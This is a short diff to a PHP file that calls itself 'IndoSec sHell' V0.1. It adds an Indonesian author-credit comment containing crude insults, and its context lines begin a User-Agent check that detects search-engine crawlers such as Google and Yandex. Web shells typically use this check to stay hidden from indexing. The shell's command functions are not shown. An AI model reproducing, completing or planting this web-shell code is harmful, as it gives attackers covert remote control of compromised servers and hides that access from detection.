@@ -1,5 +1,20 @@
 <?php
 
+/*
+	* Konsep Shell : Brillyan -Founder { IndoSec }-
+	* Pembuat : Rizsyad AR - { IndoSec }
+	
+	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
+	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
+	
+
+	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya
+
+	* { IndoSec sHell }
+	* @2022 { IndoSec } -Rizsyad AR-
+	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.1
+*/
+
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
